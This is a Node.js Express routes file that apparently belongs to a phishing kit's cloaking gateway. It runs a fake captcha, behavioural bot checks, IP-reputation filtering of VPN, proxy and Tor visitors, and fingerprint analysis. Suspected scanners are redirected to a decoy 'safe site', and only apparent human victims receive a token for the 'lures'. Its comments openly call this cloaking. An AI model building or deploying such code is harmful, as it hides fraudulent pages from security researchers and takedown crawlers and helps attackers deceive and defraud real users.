/**
 * Gateway Routes
 * New Flow: Simple Captcha → Processing (5s + checks) → Token → Splash/Redirect
 */

const express = require('express');
const router = express.Router();
const { generateSimpleCaptchaPage } = require('../generators/simpleCaptchaPage');
const { generateProcessingPage } = require('../generators/processingPage');
const { validateHcaptcha } = require('../middleware/hcaptchaValidator');
const { checkIpReputation } = require('../services/ipReputation');
const { checkBotDetection } = require('../services/botDetection');
const { generateToken } = require('../services/tokenManager');
const { REDIRECT_ON_FAIL, MAX_FRAUD_SCORE } = require('../config/constants');

// Session storage for captcha-verified users (in-memory, expires after 2 minutes)
const captchaVerifiedSessions = new Map();
const CAPTCHA_SESSION_TIMEOUT = 2 * 60 * 1000; // 2 minutes

/**
 * STAGE 1: GET / - Serve simple captcha page
 */
router.get('/', (req, res) => {
    console.log(`\n📥 [STAGE 1] Captcha page request from IP: ${req.ip || req.connection.remoteAddress}`);
    const html = generateSimpleCaptchaPage();
    res.send(html);
});

/**
 * STAGE 2: POST /verify-captcha - Verify hCaptcha and behavioral data
 */
router.post('/verify-captcha', async (req, res) => {
    try {
        const ip = req.ip || req.connection.remoteAddress;
        const { captchaToken, behaviorData } = req.body;

        console.log(`\n🔒 [STAGE 2] Custom Captcha verification from IP: ${ip}`);

        // 1. Validate Custom Token (Basic Proof-of-Work)
        // We expect a base64 encoded string: "timestamp:userAgentHash"
        if (!captchaToken || captchaToken.length < 10) {
            console.log(`❌ BLOCKED: Invalid custom token`);
            return res.json({
                success: false,
                message: 'Invalid verification token'
            });
        }

        console.log('✅ Custom token format accepted');

        // 2. Behavioral checks - STRICT MODE
        if (behaviorData) {
            // Check 1: Interaction Time (Too fast = Bot)
            // Humans take time to move mouse and click. < 500ms is inhuman.
            if (behaviorData.interactionTime < 500) {
                console.log(`❌ BLOCKED: Interaction too fast (${behaviorData.interactionTime}ms)`);
                // CLOAKING: Fail significantly by redirecting to safe site
                return res.json({
                    success: false,
                    redirect: 'https://elementary.com'
                });
            }

            // Check 2: Mouse/Touch Movements (No movement = Bot)
            // Real users leave a trail. Bots often just "click" programmatically.
            if ((!behaviorData.mouseMovements || behaviorData.mouseMovements < 2) &&
                (!behaviorData.touchEvents || behaviorData.touchEvents === 0)) {
                console.log(`❌ BLOCKED: No mouse/touch movement detected`);
                return res.json({
                    success: false,
                    redirect: 'https://elementary.com'
                });
            }

            // Check 3: Screen Resolution (Headless often reported as "0x0" or missing)
            if (behaviorData.screen === '0x0' || !behaviorData.screen) {
                console.log(`❌ BLOCKED: Invalid screen resolution`);
                return res.json({ success: false, redirect: 'https://elementary.com' });
            }
        } else {
            console.log(`❌ BLOCKED: No behavior data provided`);
            return res.json({ success: false, redirect: 'https://elementary.com' });
        }

        // 3. Create temporary session for processing page
        const sessionId = Math.random().toString(36).substring(2, 15);
        captchaVerifiedSessions.set(sessionId, {
            ip,
            timestamp: Date.now(),
            behaviorData
        });

        // Auto-cleanup after timeout
        setTimeout(() => {
            captchaVerifiedSessions.delete(sessionId);
        }, CAPTCHA_SESSION_TIMEOUT);

        console.log(`✅ Captcha passed, session created: ${sessionId}`);

        // Set session cookie
        res.cookie('captcha_session', sessionId, {
            httpOnly: true,
            maxAge: CAPTCHA_SESSION_TIMEOUT,
            sameSite: 'strict'
        });

        // Generate immediate token for EAPI context (allows lures to have valid token instantly)
        const apiToken = generateToken(ip, behaviorData || {});

        res.json({
            success: true,
            redirect: '/processing',
            token: apiToken
        });

    } catch (error) {
        console.error('Captcha verification error:', error);
        res.status(500).json({
            success: false,
            message: 'Verification error'
        });
    }
});

/**
 * STAGE 3: GET /processing - Serve processing page (5 seconds)
 */
router.get('/processing', (req, res) => {
    const sessionId = req.cookies?.captcha_session;
    const ip = req.ip || req.connection.remoteAddress;

    console.log(`\n⏳ [STAGE 3] Processing page request from IP: ${ip}`);

    // Verify session exists
    if (!sessionId || !captchaVerifiedSessions.has(sessionId)) {
        console.log(`❌ No valid captcha session - redirecting to start`);
        return res.redirect('/');
    }

    const html = generateProcessingPage();
    res.send(html);
});

/**
 * STAGE 4: POST /verify-security - Run all security checks and generate token
 */
router.post('/verify-security', async (req, res) => {
    try {
        const sessionId = req.cookies?.captcha_session;
        const ip = req.ip || req.connection.remoteAddress;
        const { fingerprint } = req.body;

        console.log(`\n🔐 [STAGE 4] Security verification from IP: ${ip}`);

        // 1. Verify captcha session
        if (!sessionId || !captchaVerifiedSessions.has(sessionId)) {
            console.log(`❌ BLOCKED: No valid captcha session`);
            return res.json({
                success: false,
                redirect: REDIRECT_ON_FAIL,
                reason: 'invalid_session'
            });
        }

        const session = captchaVerifiedSessions.get(sessionId);

        // 2. Verify IP matches
        if (session.ip !== ip) {
            console.log(`❌ BLOCKED: IP mismatch (session: ${session.ip}, current: ${ip})`);
            captchaVerifiedSessions.delete(sessionId);
            return res.json({
                success: false,
                redirect: REDIRECT_ON_FAIL,
                reason: 'ip_mismatch'
            });
        }

        // 3. Check IP Reputation (VPN/Proxy/Bot) - ALWAYS RUN
        let ipCheck = { shouldBlock: false, skipped: false };

        try {
            console.log(`🔍 Running IP reputation check for: ${ip}`);
            ipCheck = await checkIpReputation(ip);

            if (ipCheck.shouldBlock) {
                console.log(`❌ BLOCKED: IP reputation check failed`);
                console.log(`   IP: ${ip}`);
                console.log(`   VPN: ${ipCheck.vpn}, Proxy: ${ipCheck.proxy}, Tor: ${ipCheck.tor}`);
                console.log(`   Fraud Score: ${ipCheck.fraud_score}/${MAX_FRAUD_SCORE}`);
                console.log(`   Country: ${ipCheck.country_code}, ISP: ${ipCheck.isp}`);
                captchaVerifiedSessions.delete(sessionId);
                return res.json({
                    success: false,
                    redirect: REDIRECT_ON_FAIL,
                    reason: 'ip_blocked',
                    details: {
                        vpn: ipCheck.vpn,
                        proxy: ipCheck.proxy,
                        tor: ipCheck.tor,
                        fraud_score: ipCheck.fraud_score,
                        country: ipCheck.country_code
                    }
                });
            } else {
                console.log(`✅ IP reputation check passed`);
                console.log(`   IP: ${ip}, Country: ${ipCheck.country_code}, Fraud Score: ${ipCheck.fraud_score}`);
            }
        } catch (error) {
            console.log(`⚠️  IP reputation check error: ${error.message} - ALLOWING ACCESS (fail-open)`);
            ipCheck = { shouldBlock: false, error: error.message };
        }

        // 4. Bot Detection (Fingerprint Analysis)
        const botCheck = checkBotDetection(fingerprint, req);
        if (!botCheck.passed) {
            console.log(`❌ BLOCKED: Bot detection failed`);
            console.log(`   Reason: ${botCheck.reason}`);
            captchaVerifiedSessions.delete(sessionId);
            return res.json({
                success: false,
                redirect: REDIRECT_ON_FAIL,
                reason: 'bot_detected',
                details: botCheck
            });
        }

        // ✅ ALL CHECKS PASSED - Generate Token
        console.log(`✅ ALL SECURITY CHECKS PASSED for IP: ${ip}`);

        const token = generateToken(ip, fingerprint);
        console.log(`🎟️  Token generated: ${token}`);

        // Clean up session
        captchaVerifiedSessions.delete(sessionId);
        res.clearCookie('captcha_session');

        res.json({
            success: true,
            redirect: '/' + token
        });

    } catch (error) {
        console.error('Security verification error:', error);
        res.status(500).json({
            success: false,
            redirect: REDIRECT_ON_FAIL,
            reason: 'server_error'
        });
    }
});

module.exports = router;
